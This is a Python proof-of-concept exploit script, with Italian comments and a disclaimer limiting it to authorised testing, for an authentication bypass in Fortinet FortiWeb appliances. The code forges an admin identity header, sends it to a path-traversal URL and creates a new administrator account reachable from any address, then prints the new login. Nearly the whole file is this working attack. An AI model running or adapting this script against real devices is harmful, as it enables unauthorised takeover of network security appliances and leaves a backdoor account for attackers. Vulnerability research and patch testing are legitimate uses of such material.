# CVE-2025-xxxx: Fortinet FortiWeb Oct-Nov 2025 Auth Bypass PoC (Proof-of-Concept)
#
# Author: Emanuele De Lucia
#
# !!! ATTENZIONE !!! 
#
# Questo script è destinato esclusivamente a scopi educativi, di ricerca e di test di sicurezza autorizzati.                                  
#
# Condizioni d'Uso:
#
# ** Utilizzando questo script si dichiara di comprenderne la natura e di accettarne un utilizzo etico e legale.
# ** L'autore non è responsabile di danni diretti o indiretti causati dall'utilizzo di questo codice.

import argparse
import requests
import json
import base64
from uuid import uuid4
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def get_args():

    parser = argparse.ArgumentParser(description="FortiWeb Auth Bypass PoC")
    parser.add_argument("target", help="The IP address of the target FortiWeb")
    return parser.parse_args()

def generate_exploit_data():

    user = str(uuid4())[:8]
    passwd = user

    cgiinfo_json = {
        "username": "admin", "profname": "prof_admin",
        "vdom": "root", "loginname": "admin"
    }
    cgiinfo_b64 = base64.b64encode(json.dumps(cgiinfo_json).encode()).decode()

    headers = {
        "CGIINFO": cgiinfo_b64,
        "Content-Type": "application/json",
    }

    body = {
        "data": {
        "q_type": 1,
        "name": user,
        "access-profile": "prof_admin",
        "access-profile_val": "0",
        "trusthostv4": "0.0.0.0/0",
        "trusthostv6": "::/0",
        "last-name": "",
        "first-name": "",
        "email-address": "",
        "phone-number": "",
        "mobile-number": "",
        "hidden": 0,
        "comments": "",
        "sz_dashboard": -1,
        "type": "local-user",
        "type_val": "0",
        "admin-usergrp_val": "0",
        "wildcard_val": "0",
        "accprofile-override_val": "0",
        "sshkey": "",
        "passwd-set-time": 0,
        "history-password-pos": 0,
        "history-password0": "",
        "history-password1": "",
        "history-password2": "",
        "history-password3": "",
        "history-password4": "",
        "history-password5": "",
        "history-password6": "",
        "history-password7": "",
        "history-password8": "",
        "history-password9": "",
        "force-password-change": "disable",
        "force-password-change_val": "0",
        "password": passwd
        }
    }
    
    return user, passwd, headers, body

def send_exploit(host, path, headers, body):
    """Tenta di inviare il payload dell'exploit."""
    url = f"https://{host}{path}"
    print(f"[*] Sending exploit to {url}")
    
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        
        response = requests.post(
            url,
            json=body,
            headers=headers,
            verify=False,
            timeout=10
        )
        
        return response
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed: Target {host} not reachable.")
    except requests.exceptions.Timeout:
        print(f"[-] Connection failed: Request timed out.")
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred: {e}")
    
    return None

def main():
    args = get_args()
    
    user, passwd, headers, body = generate_exploit_data()
    raw_path = "/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi"

    print("\n" + "="*50)
    print(" PRE-FLIGHT DATA")
    print("="*50)
    print(f"[+] Target URL: https://{args.target}{raw_path}")
    
    print("\n[+] Headers:")
    print(json.dumps(headers, indent=2))
    
    print("\n[+] JSON Payload (Body):")
    print(json.dumps(body, indent=2))
    print("="*50)
    print(f"\n[*] Sending exploit to {args.target}...")

    response = send_exploit(args.target, raw_path, headers, body)
    
    if response and response.status_code == 200:
        print("[+] Exploit sent successfully.")
        print(f"[*] Check for the new user [ {user} ] with password [ {passwd} ]")
    elif response:
        print(f"[-] Exploit failed. Status Code: {response.status_code}")
        print(f"[-] Response (first 200 chars): {response.text[:200]}...")
    else:
        print(f"[-] Exploit failed: Target may be patched.")

if __name__ == "__main__":
    main()
